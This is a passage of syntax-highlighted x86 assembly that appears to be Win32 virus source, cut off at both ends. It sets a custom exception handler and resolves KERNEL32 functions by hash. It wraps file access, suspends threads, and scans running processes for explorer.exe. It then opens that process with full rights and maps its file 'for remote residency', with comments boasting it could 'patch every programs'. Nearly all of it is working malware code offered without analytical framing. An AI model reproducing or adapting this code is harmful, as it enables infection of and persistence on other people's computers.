</span><span class="sc5">SetSEH</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TemporarySEH</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BackNow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TemporarySEH</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TemporarySEH</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; now we set the SEH</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">BackNow</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; here we get</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getpseudodelta</span><span class="sc0">
</span><span class="sc5">getpseudodelta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getpseudodelta</span><span class="sc0">       </span><span class="sc1">; take again the delta,</span><span class="sc0">
                        </span><span class="sc1">; grrr, f- ms programmers</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TemporarySEH</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; and then back now!</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">backup</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">TemporarySEH</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; our SEH...</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">originalpriority</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">getapis1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32.'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0ab16d5ceh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0cb8d7a80h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">046863856h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04690b856h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">stubtest</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">returnapi1</span><span class="sc4">:</span><span class="sc0">      

</span><span class="sc5">GlobalAlloc0</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetCurrentProcess0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetPriorityClass0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetPriorityClass0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FinStub</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">finloader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; File Action API interface     Note, I could remplace that by big flat</span><span class="sc0">
</span><span class="sc1">;                               true win32 file apis but I don't want to...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Open_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; iReadWrite = OF_READWRITE</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">workingdir</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; point to the name datas</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lopen</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; open the file</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Close_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; close the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lclose</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Write_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Write in the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lwrite</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Read_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Read in the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lread</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Seek_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Seek in the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Llseek</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">alloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">MemAlloc</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Reviewved for nties compatib.</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00100000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">111b</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAlloc</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; just allocating...</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Allocitsokay</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Allocitsokay</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Delloc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000h</span><span class="sc0">                       </span><span class="sc1">; mem decommit</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                                               </span><span class="sc1">; size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualFree</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InitCritical</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stopflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skipinf</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ForeignThread</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SuspendThread</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; okay stop task </span><span class="sc0">
                            </span><span class="sc1">; bastard....</span><span class="sc0">
</span><span class="sc5">skipinf</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LeaveCritical</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stopflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; depend on resident or not</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skipinf</span><span class="sc0">


</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ForeignThread</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ResumeThread</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; and then recreate it</span><span class="sc0">


</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">stopflag</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Residency1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; byebye</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAlloc</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocT</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; preset these apis</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThread</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThreadT</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; for remote residency</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; set NT compatibilty</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fini001</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;exist only under win9x</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">datadummy</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; how much datas in</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">1024</span><span class="sc0">                </span><span class="sc1">; buffer</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Process32First</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get 1st process in</span><span class="sc0">
                            </span><span class="sc1">; mem infos</span><span class="sc0">
</span><span class="sc5">testnext5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">datadummy</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This could be applied to everything, and you could patch every programs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">checkthat</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'LPXE'</span><span class="sc0">  </span><span class="sc1">; check explorer.exe ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wefoundit5</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">checkthat</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">checkthat2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'lpxe'</span><span class="sc0">  </span><span class="sc1">; explorer</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wefoundit5</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">checkthat2</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">backhere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">datadummy</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;mov    dword ptr [edx],1024            ; ms programmers are clown...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Process32Next</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get next process in mem</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">testnext5</span><span class="sc0">               </span><span class="sc1">; no explorer in memory ???</span><span class="sc0">
                        </span><span class="sc1">; hahahaha</span><span class="sc0">
</span><span class="sc5">fini0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">fini001</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; come back!</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; Exit code 0</span><span class="sc0">

</span><span class="sc5">wefoundit5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">datadummy</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; what we want</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01f0fffh</span><span class="sc0">                </span><span class="sc1">; all right value, Tanx to peon</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OpenProcess</span><span class="sc4">]</span><span class="sc0">         

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; we got the process handle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Lopen</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; going to open the explorer</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; and going to map it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; this long procedure is boring</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
